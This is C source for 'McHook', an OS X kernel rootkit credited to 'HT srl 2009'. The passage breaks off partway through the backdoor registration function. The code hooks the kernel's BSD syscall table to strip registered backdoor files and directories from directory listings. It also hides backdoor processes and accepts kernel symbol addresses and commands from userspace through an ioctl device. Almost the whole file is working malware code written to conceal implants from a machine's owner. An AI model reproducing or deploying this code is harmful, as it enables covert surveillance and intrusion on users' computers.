/*
 * McHook, mchook.c
 *  OS X KSpace Rootkit
 * 
 * [Features]
 * x sysent hooking for bsd syscalls
 * x mach_trap_table hooking for mach traps
 * x process hiding
 *    x uspace->kspace proc hiding handler (kill)
 * x kext hiding
 * x filesystem hiding
 *    x uspace->kspace communication channel (ioctl)
 * x Data structures keeping track of USpace Backdoor(s) pid
 *   and Path(s)/Filename(s)
 *
 *
 * Created by revenge on 20/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <mach/mach_types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/dirent.h>
#include <sys/conf.h>
#include <sys/attr.h>

#include <AvailabilityMacros.h>
#include <sys/ioctl.h>
#include <miscfs/devfs/devfs.h>

#include <stdint.h>

#include "mchook.h"

#pragma mark -
#pragma mark Global define(s)
#pragma mark -

#define MK_MBUF       1
#define PLENGTH       6

#define IM            "appleHID"
#define OSAX          "appleOsax"
#define KERNEL_BASE   0xffffff8000200000 // SL 10.6.4

/*#define DEBUG*/

#pragma mark -
#pragma mark Global variables
#pragma mark -

static reg_backdoors_t *g_reg_backdoors[MAX_BACKDOOR_ENTRIES];
static exclusion_list_t g_exclusion_list[2] = {
  "launchd", 1,
  "launchctl", 1,
};

static int g_process_excluded = 2;
static int g_kext_hidden      = 0;

// Holding current kmod entry pointer
//static kmod_info_t *currentK;

// Holding the uspace backdoor count
static int g_registered_backdoors = 0;

// BSD IOCTL stuff
static int major              = -1;
static void *devfs_handle     = 0;

static int g_os_major         = 0;
static int g_os_minor         = 0;
static int g_os_bugfix        = 0;

static int g_symbols_resolved = 0;

// Character device switch table
static struct cdevsw chardev = {
  cdev_open,  // open
  cdev_close, // close
  eno_rdwrt,  // read
  eno_rdwrt,  // write
  cdev_ioctl, // ioctl
  eno_stop,   // stop
  eno_reset,  // reset
  0,          // ttys
  eno_select, // select
  eno_mmap,   // mmap
  eno_strat,  // strategy
  eno_getc,   // getc
  eno_putc,   // putc
  0           // type
};

#pragma mark -
#pragma mark Main IOCTL Functions
#pragma mark -

static int cdev_open(dev_t dev, int flags, int devtype, struct proc *p) {
  return 0;
}

static int cdev_close(dev_t dev, int flags, int devtype, struct proc *p) {
  return 0;
}

static int cdev_ioctl(dev_t dev,
                      u_long cmd,
                      caddr_t data,
                      int fflag,
                      struct proc *p)
{
  int error   = 0;
  char username[MAX_USER_SIZE];
  
  switch (cmd) {
    case MCHOOK_INIT: {
      if (data) {
        strncpy(username, (char *)data, MAX_USER_SIZE);
#ifdef DEBUG
        printf("[MCHOOK] Init for user %s with pid %d\n", username, p->p_pid);
#endif
        if (backdoor_init(username, p) == FALSE) {
#ifdef DEBUG
          printf("[MCHOOK] Error on init\n");
#endif
        }
      }
    } break;
    case MCHOOK_HIDEK: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_HIDEK called\n");
#endif
      
      if (g_symbols_resolved == 1) {
        // TODO: Hide KEXT is unstable
        
        if (g_os_major == 10 && g_os_minor == 5) {
#ifdef DEBUG
          printf("[MCHOOK] Not hiding kext for leopard, unstable\n");
#endif
          
          //hide_kext_leopard();
        }
        else {
#ifdef DEBUG
          printf("[MCHOOK] KEXT hiding not supported yet\n");
#endif
        }
      }
      else {
#ifdef DEBUG
        printf("[MCHOOK] Error, symbols not correctly resolved\n");
#endif
      }
    } break;
    case MCHOOK_HIDEP: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_HIDEP called\n");
#endif
      
      if (data && g_symbols_resolved == 1) {
        strncpy(username, (char *)data, MAX_USER_SIZE);
#ifdef DEBUG
        pid_t pid = p->p_pid;
        printf("[MCHOOK] Hiding PID: %d\n", pid);
#endif
        
        int backdoor_index = 0;
        
        if ((backdoor_index = get_active_bd_index(username, p->p_pid)) == -1) {
#ifdef DEBUG
          printf("[MCHOOK] ERR: get_active_bd_index returned -1 in HIDEP\n");
#endif
          return error;
        }
        
        if (g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
#ifdef DEBUG
          printf("[MCHOOK] ERR: Backdoor is already hidden\n");
#endif
          return error;
        }
        
        if (hide_proc(p, username, backdoor_index) == -1) {
#ifdef DEBUG
          printf("[MCHOOK] hide_proc failed\n");
#endif
        }
      }
    } break;
    case MCHOOK_HIDED: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_HIDED called\n");
#endif
      if (data) {
        char dirName[MAX_DIRNAME_SIZE];
        strncpy(dirName, (char *)data, MAX_DIRNAME_SIZE);
        add_dir_to_hide(dirName, p->p_pid);
      }
    } break;
    case MCHOOK_UNREGISTER: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_UNREGISTER called (%lu)\n", cmd);
#endif
      if (data && g_symbols_resolved == 1) {
        strncpy(username, (char *)data, MAX_USER_SIZE);
        
#ifdef DEBUG
        printf("[MCHOOK] Unregister for user: %s\n", username);
        printf("[MCHOOK] backdoorCounter: %d\n", g_registered_backdoors);
#endif
        
#if 0
        //
        // g_backdoor_current could get messed up (e.g. 2 backdoors on the same machine
        // one gets uninstalled, the other is still active but there's no way
        // for it to be referenced by g_backdoor_current, thus we call get_active_bd_index
        //
        if (g_backdoor_current == -1) {
          if ((g_backdoor_current = get_active_bd_index(p, username)) == -1) {
#ifdef DEBUG
            printf("[MCHOOK] unregistering err - backdoor not registered?!!\n");
#endif
          }
        }
          
        if (g_backdoor_current != -1
            && g_reg_backdoors[g_backdoor_current]->isProcHidden == 1) {
#ifdef DEBUG
          printf("[MCHOOK] Re-linking process %d\n", p->p_pid);
#endif
        
          unhide_proc(p);
        }
#endif
        
        int backdoor_index;
        if ((backdoor_index = get_active_bd_index(username, p->p_pid)) == -1) {
#ifdef DEBUG
          printf("[MCHOOK] ERR: get_active_bd_index returned -1 in UNREGISTER\n");
#endif
          
          return error;
        }
        
        if (g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
#ifdef DEBUG
          printf("[MCHOOK] Backdoor is hidden, unhiding\n");
#endif
          unhide_proc(p, backdoor_index);
        }
        
        //g_backdoor_current = -1;
        dealloc_meh(username, p->p_pid);
        
        if (g_registered_backdoors == 0) {
#ifdef DEBUG
          printf("[MCHOOK] No more backdoor left, unhooking\n");
#endif
          remove_hooks();
        }
      }
    } break;
    case MCHOOK_GET_ACTIVES: {
      *data = g_registered_backdoors;
    } break;
#if __LP64__ || NS_BUILD_32_LIKE_64
    case MCHOOK_SOLVE_SYM_64: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_SOLVE_SYM_64\n");
#endif
      
      symbol64_t *syms = (symbol64_t *)data;
      
#ifdef DEBUG
      printf("[MCHOOK] hash    : 0x%llx\n", syms->hash);
      printf("[MCHOOK] address : 0x%llx\n", syms->address);
#endif
      
      if (g_symbols_resolved == 1)
        return error;
      
      switch (syms->hash) {
        case KMOD_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] kmod symbol received\n");
#endif
          i_kmod = (kmod_info_t *)syms->address;
        } break;
        case NSYSENT_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] nsysent symbol received\n");
#endif
          i_nsysent = (int *)syms->address;
#ifdef DEBUG
          printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
#endif
        } break;
        case TASKS_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] tasks symbol received\n");
#endif
          i_tasks = (queue_head_t *)syms->address;
        } break;
        case ALLPROC_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] allproc symbol received\n");
#endif
          i_allproc = (struct proclist *)syms->address;
        } break;
        case TASKS_COUNT_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] tasks_count symbol received\n");
#endif
          i_tasks_count = (int *)syms->address;
        } break;
        case NPROCS_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] nprocs symbol received\n");
#endif
          i_nprocs = (int *)syms->address;
        } break;
        case TASKS_THREADS_LOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] tasks_threads_lock symbol received\n");
#endif
          i_tasks_threads_lock = (lck_mtx_t *)syms->address;
        } break;
        case PROC_LOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_lock symbol received\n");
#endif
          i_proc_lock = (void *)syms->address;
        } break;
        case PROC_UNLOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_unlock symbol received\n");
#endif
          i_proc_unlock = (void *)syms->address;
        } break;
        case PROC_LIST_LOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_list_lock symbol received\n");
#endif
          i_proc_list_lock = (void *)syms->address;
        } break;
        case PROC_LIST_UNLOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_list_unlock symbol received\n");
#endif
          i_proc_list_unlock = (void *)syms->address;
        } break;
        default: {
#ifdef DEBUG
          printf("[MCHOOK] symbol not supported yet\n");
#endif
        } break;
      }
    } break;
#else
    case MCHOOK_SOLVE_SYM_32: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_SOLVE_SYM_32\n");
#endif
      
      symbol32_t *syms = (symbol32_t *)data;
      
#ifdef DEBUG
      printf("[MCHOOK] hash    : 0x%x\n", syms->hash);
      printf("[MCHOOK] address : 0x%x\n", syms->address);
#endif
      if (g_symbols_resolved == 1)
        return error;

      switch (syms->hash) {
        case KMOD_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] kmod symbol received\n");
#endif
          i_kmod = (kmod_info_t *)syms->address;
        } break;
        case NSYSENT_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] nsysent symbol received\n");
#endif
          i_nsysent = (int *)syms->address;
#ifdef DEBUG
          printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
#endif
        } break;
        case TASKS_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] tasks symbol received\n");
#endif
          i_tasks = (queue_head_t *)syms->address;
        } break;
        case ALLPROC_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] allproc symbol received\n");
#endif
          i_allproc = (struct proclist *)syms->address;
        } break;
        case TASKS_COUNT_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] tasks_count symbol received\n");
#endif
          i_tasks_count = (int *)syms->address;
        } break;
        case NPROCS_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] nprocs symbol received\n");
#endif
          i_nprocs = (int *)syms->address;
        } break;
        case TASKS_THREADS_LOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] tasks_threads_lock symbol received\n");
#endif
          i_tasks_threads_lock = (lck_mtx_t *)syms->address;
        } break;
        case PROC_LOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_lock symbol received\n");
#endif
          i_proc_lock = (void *)syms->address;
        } break;
        case PROC_UNLOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_unlock symbol received\n");
#endif
          i_proc_unlock = (void *)syms->address;
        } break;
        case PROC_LIST_LOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_list_lock symbol received\n");
#endif
          i_proc_list_lock = (void *)syms->address;
        } break;
        case PROC_LIST_UNLOCK_HASH: {
#ifdef DEBUG
          printf("[MCHOOK] proc_list_unlock symbol received\n");
#endif
          i_proc_list_unlock = (void *)syms->address;
        } break;
        default: {
#ifdef DEBUG
          printf("[MCHOOK] symbol not supported yet\n");
#endif
        } break;
      }
    } break;
#endif
    case MCHOOK_FIND_SYS: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_FIND_SYS called\n");
#endif
      
      if (data && check_symbols_integrity() == 1) {
#ifdef DEBUG
        printf("[MCHOOK] symbols resolved\n");
#endif
        os_version_t *os_ver = (os_version_t *)data;
        g_os_major  = os_ver->major;
        g_os_minor  = os_ver->minor;
        g_os_bugfix = os_ver->bugfix;
        
        // Find sysent table
        _sysent = find_sysent(os_ver);
        if (_sysent == NULL) {
#ifdef DEBUG
          printf("[MCHOOK] sysent not found\n");
#endif
        }
        else {
#ifdef DEBUG
          printf("[MCHOOK] All symbols were resolved and sysent found\n");
#endif
          place_hooks();
        }
      }
      else {
#ifdef DEBUG
        printf("[MCHOOK] No data or symbols not resolved (%d)\n", g_symbols_resolved);
#endif
      }
    } break;
    default: {
#ifdef DEBUG
      printf("[MCHOOK] Unknown command called dudeeeee: %lu\n", cmd);
#endif
      error = EINVAL;
    } break;
  }
  
  return error;
}

#pragma mark -
#pragma mark Hooks
#pragma mark -

int hook_getdirentries(struct proc *p,
                       struct mk_getdirentries_args *uap,
                       int *retval)
{
  struct dirent *tmp, *current;
  long size, count, length = 0;
  int flag = 0;
  int i_entry, i_path;
  
  real_getdirentries(p, uap, retval);
  size = retval[0];
  
  if (size > 0
      && check_for_process_exclusions(p->p_pid) == -1) {
    MALLOC(tmp, struct dirent *, size, MK_MBUF, M_WAITOK);
    copyin(uap->buf, tmp, size);
    
    count = size;
    current = (struct dirent *)(char *)tmp;
    
    while (count > 0) {
      length = current->d_reclen;
      count -= length;
      
      for (i_entry = 0; i_entry < g_registered_backdoors; i_entry++) {
        //
        // Enforce checks in order to avoid situation where all the files are hidden
        // from the disk since the g_reg_backdoors structure is inconsistent
        //
        if (g_reg_backdoors[i_entry]->is_active == 1) {
          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->path_counter; i_path++) {
            if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
              continue;
            
            if (strncmp((char *)&(current->d_name),
                        g_reg_backdoors[i_entry]->path[i_path],
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0) {
              if (count != 0) {
                // Remove the entry from buf
                memmove((char *)current, (char *)current + length, count);
                flag = 1;
              }
              // Adjust the size since we removed an entry
              size -= length;
              break;
            }
          }
        }
        
        if (flag)
          break;
      }
#if 0
      if (strncmp((char *)&(current->d_name), PREFIX, PLENGTH) == 0) {
        if (count != 0) {
          // Remove the entry from buf
          bcopy((char *)current + length, (char *)current, count - length);
          flag = 1;
        }
        // Adjust the size since we removed an entry
        size -= length;
      }
#endif
      // Last dir always has length of 0
      if (current->d_reclen == 0)
        count = 0;
      // Point to the next struct entry if we didn't remove anything
      if (count != 0 && flag == 0)
        current = (struct dirent *)((char *)current + length);
      flag = 0;
    }
    
    // Update the return size
    *retval = size;
    // Copy back to uspace the modified buffer
    copyout(tmp, uap->buf, size);
    FREE(tmp, MK_MBUF);
  }
  
  return(0);
}

int hook_getdirentries64(struct proc *p,
                         struct mk_getdirentries64_args *uap,
                         int *retval)
{
  void *tmp;
  struct direntry *current;
  long size, count, length = 0;
  int flag = 0;
  int i_entry, i_path;
  
  real_getdirentries64(p, uap, retval);
  size = retval[0];

  if (size > 0
      && check_for_process_exclusions(p->p_pid) == -1) {
    MALLOC(tmp, struct direntry *, size, MK_MBUF, M_WAITOK);
    copyin(uap->buf, tmp, size);

    count = size;
    current = (struct direntry *)(char *)tmp;
    
    while (count > 0) {
      length = current->d_reclen;
      count -= length;

      for (i_entry = 0; i_entry < g_registered_backdoors; i_entry++) {
        //
        // Enforce checks in order to avoid situation where all the files are hidden
        // from the disk since the g_reg_backdoors structure is inconsistent
        //
        if (g_reg_backdoors[i_entry]->is_active == 1) {
          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->path_counter; i_path++) {
            if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
              continue;
            
            if (strncmp((char *)&(current->d_name),
                        g_reg_backdoors[i_entry]->path[i_path],
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0) {
              if (count != 0) {
                // Remove the entry from buf
                memmove((char *)current, (char *)current + length, count);
                flag = 1;
              }
              // Adjust the size since we removed an entry
              size -= length;
              break;
            }
          }            
        }
        
        if (flag)
          break;
      }
#if 0
      if (strncmp((char *)&(current->d_name), PREFIX, PLENGTH) == 0) {
        if (count != 0) {
          // Remove the entry from buf
          bcopy((char *)current + length, (char *)current, count - length);
          flag = 1;
        }
        // Adjust the size since we removed an entry
        size -= length;
      }
#endif
      // Last entry always has length of 0
      if (current->d_reclen == 0)
        count = 0;
      // Point to the next struct entry
      if (count != 0 && flag == 0)
        current = (struct direntry *)((char *)current + length);
      flag = 0;
    }
    
    // Update the return size
    *retval = size;
    // Copy back to uspace the modified buffer
    copyout(tmp, uap->buf, size);
    FREE(tmp, MK_MBUF);
  }

  return(0);
}

int hook_getdirentriesattr(struct proc *p,
                           struct mk_getdirentriesattr_args *uap,
                           int *retval)
{
  char procname[20];
  char *curr_entry = NULL;
  
  attr_list_t al;
  int success = 0;
  int flag = 0;
  int curr_backdoor, curr_path;
  int index = 0;
  
  u_int32_t count         = 0;
  u_int32_t entry_size    = 0;
  
  /*attribute_buffer_t *buf, *this_entry;*/
  FInfoAttrBuf *this_entry;
  char *buf;

  success = real_getdirentriesattr(p, uap, retval);
  proc_name(p->p_pid, procname, sizeof(procname));
  
#ifdef DEBUG_VERBOSE
  printf("p_start sec: %d for %s\n", (int)p->p_start.tv_sec, procname);
#endif
  
  if (check_for_process_exclusions(p->p_pid) == -1) {
#ifdef DEBUG_VERBOSE
    printf("getdirentriesattr called by %s\n", procname); 
    printf("ATTRLIST - %s commonattr %08x | volattr %08x | fileattr %08x | dirattr %08x | forkattr %08x | %sfollow\n",
           p->p_comm, al.commonattr, al.volattr, al.fileattr, al.dirattr, al.forkattr,
           (uap->options & FSOPT_NOFOLLOW) ? "no" : "");
    getAttributesForBitFields(al);
#endif
    
    copyin(uap->alist, (caddr_t)&al, sizeof(al));
    copyin(uap->count, (caddr_t)&count, sizeof(count));

#ifdef DEBUG_VERBOSE
    printf("bufferSize: %d\n", (int)uap->buffersize);
#endif
    
    /*MALLOC(buf, attribute_buffer_t *, uap->buffersize, MK_MBUF, M_WAITOK);*/
    MALLOC(buf, char *, uap->buffersize, MK_MBUF, M_WAITOK);
    copyin(uap->buffer, (caddr_t)buf, uap->buffersize);
    
    /*this_entry = (attribute_buffer_t *)(char *)buf;*/
    this_entry = (FInfoAttrBuf *)buf;
    
    int _tmp_size = uap->buffersize;
    index = count;
    
#ifdef DEBUG_VERBOSE
    printf("[MCHOOK] _tmp_size start : %d\n", _tmp_size);
    printf("[MCHOOK] index     start : %d\n", index);
#endif

    while (_tmp_size > 0 && index > 0) {
      entry_size = this_entry->length;
      curr_entry = (char *)&this_entry->name;
      curr_entry += this_entry->name.attr_dataoffset;

#ifdef DEBUG_VERBOSE
      printf("[MCHOOK] curr_entry st  : %llx\n", (unsigned long long)curr_entry);
      printf("[MCHOOK] data offset st : %x\n", this_entry->name.attr_dataoffset);
      printf("[MCHOOK] _tmp_size st   : %x\n", _tmp_size);
      printf("[MCHOOK] index st       : %d\n", index);
#endif

      if (this_entry->name.attr_dataoffset > 0) {
        for (curr_backdoor = 0; curr_backdoor < g_registered_backdoors; curr_backdoor++) {
          //
          // Enforce checks in order to avoid situation where all the files are hidden
          // from the disk since the g_reg_backdoors structure is inconsistent
          //
          if (g_reg_backdoors[curr_backdoor]->is_active == 1) {
            for (curr_path = 0;
                 curr_path < g_reg_backdoors[curr_backdoor]->path_counter;
                 curr_path++) {
#ifdef DEBUG_VERBOSE
              printf("[MCHOOK] curr_entry f  : %llx\n", (unsigned long long)curr_entry);
              printf("[MCHOOK] g_curr_entry f: %s\n", g_reg_backdoors[curr_backdoor]->path[curr_path]);
#endif
              if (strncmp(g_reg_backdoors[curr_backdoor]->path[curr_path],
                          "",
                          strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0)
                continue;

              if (strncmp(curr_entry,
                          g_reg_backdoors[curr_backdoor]->path[curr_path],
                          strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0) {
                if ((strncmp(curr_entry, IM, strlen(IM)) == 0)
                    || (strncmp(curr_entry, OSAX, strlen(OSAX)) == 0)) {
                  if (p->p_start.tv_sec == 0) {
#ifdef DEBUG
                    printf("Entry matched for %s (first time) - skipping\n", curr_entry);
#endif
                    p->p_start.tv_sec = 1;
                    continue;
                  }
                }
#ifdef DEBUG_VERBOSE
                printf("%s REQUESTED %s\n", procname, curr_entry);
#endif

                // Remove the entry from buf
                memmove((char *)this_entry,
                        (char *)((NSUInteger)this_entry + entry_size),
                        _tmp_size);
                flag = 1;

                // Adjust the counter since we removed an entry
                count--;

                break;
              }
            }
          }

          if (flag)
            break;
        }
      }
      else {
#ifdef DEBUG_VERBOSE
        printf("[MCHOOK] dataoffset is 0\n");
#endif
      }

      _tmp_size -= entry_size;
      index -= 1;
      
      // Advance to the next entry
      /*if (_tmp_size != 0 && flag == 0)*/
        /*this_entry = (attribute_buffer_t *)((NSUInteger)this_entry + entry_size);*/
      if (_tmp_size > 0 && flag == 0) {
        char *z = ((char *)this_entry) + entry_size;
        this_entry = (FInfoAttrBuf *)z;
      }
    }
    
    // Back to uspace
    copyout((caddr_t)buf, uap->buffer, uap->buffersize);
    copyout(&count, uap->count, sizeof(count));
    
    FREE(buf, MK_MBUF);
  }
  else {
#ifdef DEBUG
    printf("Process excluded from hiding: %s\n", procname);
#endif
  }
  
  return success;
}

#pragma mark -
#pragma mark General purpose functions
#pragma mark -

#ifdef DEBUG
void getAttributesForBitFields(attr_list_t al)
{
  // commonattr checks
  if (al.commonattr & ATTR_CMN_NAME)
    printf("ATTR_CMN_NAME\n");
  if (al.commonattr & ATTR_CMN_DEVID)
    printf("ATTR_CMN_DEVID\n");
  if (al.commonattr & ATTR_CMN_FSID)
    printf("ATTR_CMN_FSID\n");
  if (al.commonattr & ATTR_CMN_OBJTYPE)
    printf("ATTR_CMN_OBJTYPE\n");
  if (al.commonattr & ATTR_CMN_OBJTAG)
    printf("ATTR_CMN_OBJTAG\n");
  if (al.commonattr & ATTR_CMN_OBJID)
    printf("ATTR_CMN_OBJID\n");
  if (al.commonattr & ATTR_CMN_OBJPERMANENTID)
    printf("ATTR_CMN_OBJPERMANENTID\n");
  if (al.commonattr & ATTR_CMN_PAROBJID)
    printf("ATTR_CMN_PAROBJID\n");
  if (al.commonattr & ATTR_CMN_SCRIPT)
    printf("ATTR_CMN_SCRIPT\n");
  if (al.commonattr & ATTR_CMN_CRTIME)
    printf("ATTR_CMN_CRTIME\n");
  if (al.commonattr & ATTR_CMN_MODTIME)
    printf("ATTR_CMN_MODTIME\n");
  if (al.commonattr & ATTR_CMN_CHGTIME)
    printf("ATTR_CMN_CHGTIME\n");
  if (al.commonattr & ATTR_CMN_ACCTIME)
    printf("ATTR_CMN_ACCTIME\n");
  if (al.commonattr & ATTR_CMN_BKUPTIME)
    printf("ATTR_CMN_BKUPTIME\n");
  if (al.commonattr & ATTR_CMN_FNDRINFO)
    printf("ATTR_CMN_FNDRINFO\n");
  if (al.commonattr & ATTR_CMN_OWNERID)
    printf("ATTR_CMN_OWNERID\n");
  if (al.commonattr & ATTR_CMN_GRPID)
    printf("ATTR_CMN_GRPID\n");
  if (al.commonattr & ATTR_CMN_ACCESSMASK)
    printf("ATTR_CMN_ACCESSMASK\n");
  if (al.commonattr & ATTR_CMN_FLAGS)
    printf("ATTR_CMN_FLAGS\n");
  if (al.commonattr & ATTR_CMN_USERACCESS)
    printf("ATTR_CMN_USERACCESS\n");
  if (al.commonattr & ATTR_CMN_EXTENDED_SECURITY)
    printf("ATTR_CMN_EXTENDED_SECURITY\n");
  if (al.commonattr & ATTR_CMN_UUID)
    printf("ATTR_CMN_UUID\n");
  if (al.commonattr & ATTR_CMN_GRPUUID)
    printf("ATTR_CMN_GRPUUID\n");
  if (al.commonattr & ATTR_CMN_FILEID)
    printf("ATTR_CMN_FILEID\n");
  if (al.commonattr & ATTR_CMN_PARENTID)
    printf("ATTR_CMN_PARENTID\n");
  if (al.commonattr & ATTR_CMN_VALIDMASK)
    printf("ATTR_CMN_VALIDMASK\n");
  if (al.commonattr & ATTR_CMN_SETMASK)
    printf("ATTR_CMN_SETMASK\n");
  if (al.commonattr & ATTR_CMN_VOLSETMASK)
    printf("ATTR_CMN_VOLSETMASK\n");
  
  // volattr checks
  if (al.volattr & ATTR_VOL_FSTYPE)
    printf("ATTR_VOL_FSTYPE\n");
  if (al.volattr & ATTR_VOL_SIGNATURE)
    printf("ATTR_VOL_SIGNATURE\n");
  if (al.volattr & ATTR_VOL_SIZE)
    printf("ATTR_VOL_SIZE\n");
  if (al.volattr & ATTR_VOL_SPACEFREE)
    printf("ATTR_VOL_SPACEFREE\n");
  if (al.volattr & ATTR_VOL_SPACEAVAIL)
    printf("ATTR_VOL_SPACEAVAIL\n");
  if (al.volattr & ATTR_VOL_MINALLOCATION)
    printf("ATTR_VOL_MINALLOCATION\n");
  if (al.volattr & ATTR_VOL_ALLOCATIONCLUMP)
    printf("ATTR_VOL_ALLOCATIONCLUMP\n");
  if (al.volattr & ATTR_VOL_IOBLOCKSIZE)
    printf("ATTR_VOL_IOBLOCKSIZE\n");
  if (al.volattr & ATTR_VOL_OBJCOUNT)
    printf("ATTR_VOL_OBJCOUNT\n");
  if (al.volattr & ATTR_VOL_FILECOUNT)
    printf("ATTR_VOL_FILECOUNT\n");
  if (al.volattr & ATTR_VOL_DIRCOUNT)
    printf("ATTR_VOL_DIRCOUNT\n");
  if (al.volattr & ATTR_VOL_MAXOBJCOUNT)
    printf("ATTR_VOL_MAXOBJCOUNT\n");
  if (al.volattr & ATTR_VOL_MOUNTPOINT)
    printf("ATTR_VOL_MOUNTPOINT\n");
  if (al.volattr & ATTR_VOL_NAME)
    printf("ATTR_VOL_NAME\n");
  if (al.volattr & ATTR_VOL_MOUNTFLAGS)
    printf("ATTR_VOL_MOUNTFLAGS\n");
  if (al.volattr & ATTR_VOL_MOUNTEDDEVICE)
    printf("ATTR_VOL_MOUNTEDDEVICE\n");
  if (al.volattr & ATTR_VOL_ENCODINGSUSED)
    printf("ATTR_VOL_ENCODINGSUSED\n");
  if (al.volattr & ATTR_VOL_CAPABILITIES)
    printf("ATTR_VOL_CAPABILITIES\n");
  if (al.volattr & ATTR_VOL_ATTRIBUTES)
    printf("ATTR_VOL_ATTRIBUTES\n");
  if (al.volattr & ATTR_VOL_INFO)
    printf("ATTR_VOL_INFO\n");
  if (al.volattr & ATTR_VOL_VALIDMASK)
    printf("ATTR_VOL_VALIDMASK\n");
  if (al.volattr & ATTR_VOL_SETMASK)
    printf("ATTR_VOL_SETMASK\n");
  
  // dirattr checks
  if (al.dirattr & ATTR_DIR_ENTRYCOUNT)
    printf("ATTR_DIR_ENTRYCOUNT\n");
  if (al.dirattr & ATTR_DIR_LINKCOUNT)
    printf("ATTR_DIR_LINKCOUNT\n");
}
#endif

int check_for_process_exclusions(pid_t pid)
{
  char procname[20];
  int i = 0;
  
  proc_name(pid, procname, sizeof(procname));
  
  for (i = 0; i < g_process_excluded; i ++) {
    if (strncmp(procname, g_exclusion_list[i].processname, MAX_USER_SIZE) == 0
        && g_exclusion_list[i].is_active == 1) {
#ifdef DEBUG
      printf("[MCHOOK] Exclusion matched for %s\n", procname);
#endif
      return 1;
    }
  }
  
  return -1;
}

void place_hooks()
{
  if (fl_getdire64 == 0) {
    real_getdirentries64 = (getdirentries64_func_t *)_sysent[SYS_getdirentries64].sy_call;
    _sysent[SYS_getdirentries64].sy_call = (sy_call_t *)hook_getdirentries64;
    fl_getdire64 = 1;
  }

  if (fl_getdire == 0) {
    real_getdirentries = (getdirentries_func_t *)_sysent[SYS_getdirentries].sy_call;
    _sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_getdirentries;
    fl_getdire = 1;
  }
  
  if (fl_getdirentriesattr == 0) {
    real_getdirentriesattr = (getdirentriesattr_func_t *)_sysent[SYS_getdirentriesattr].sy_call;
    _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)hook_getdirentriesattr;
    fl_getdirentriesattr = 1;
  }
  
#ifdef DEBUG
  printf("[MCHOOK] Hooks in place\n");
#endif
}

void remove_hooks()
{
  if (fl_getdire64) {
    _sysent[SYS_getdirentries64].sy_call = (sy_call_t *)real_getdirentries64;
    fl_getdire64 = 0;
  }
  
  if (fl_getdire) {
    _sysent[SYS_getdirentries].sy_call = (sy_call_t *)real_getdirentries;
    fl_getdire = 0;
  }
  
  if (fl_getdirentriesattr) {
    _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)real_getdirentriesattr;
    fl_getdirentriesattr = 0;
  }
}

void add_dir_to_hide(char *dirname, pid_t pid)
{
  int i = 0;
  int z = 0;
  
#ifdef DEBUG
  printf("[MCHOOK] Hiding (%s) for pid (%d)\n", dirname, pid);
#endif
  
  for (i = 0; i < g_registered_backdoors; i++) {
    if (g_reg_backdoors[i]->p->p_pid      == pid
        && g_reg_backdoors[i]->is_active  == 1) {
      for (z = 0; z < g_reg_backdoors[i]->path_counter; z ++) {
        if (strncmp(dirname, g_reg_backdoors[i]->path[z], MAX_DIRNAME_SIZE) == 0) {
#ifdef DEBUG
          printf("[MCHOOK] Path already registered (%s)!\n", dirname);
#endif
                  
          return;
        }
      }
      
      int pcounter = g_reg_backdoors[i]->path_counter;
      if (g_reg_backdoors[i]->path_counter < MAX_PATH_ENTRIES) {
        strncpy((char *)g_reg_backdoors[i]->path[pcounter],
                dirname,
                MAX_DIRNAME_SIZE);
        
#ifdef DEBUG
        printf("[MCHOOK] DIR Hidden: %s\n", g_reg_backdoors[i]->path[pcounter]);
#endif
        g_reg_backdoors[i]->path_counter++;
#ifdef DEBUG
        printf("[MCHOOK] backdoorCounter: %d\n", g_registered_backdoors);
        printf("[MCHOOK] backdoor pathCounter: %d\n", 
               g_reg_backdoors[i]->path_counter);
#endif
      }
    }
  }
}

Boolean
backdoor_init(char *username, proc_t p)
{
  int _index      = 0;
  int i           = 0;
  int bd_index    = -1;
  Boolean result  = FALSE;
  
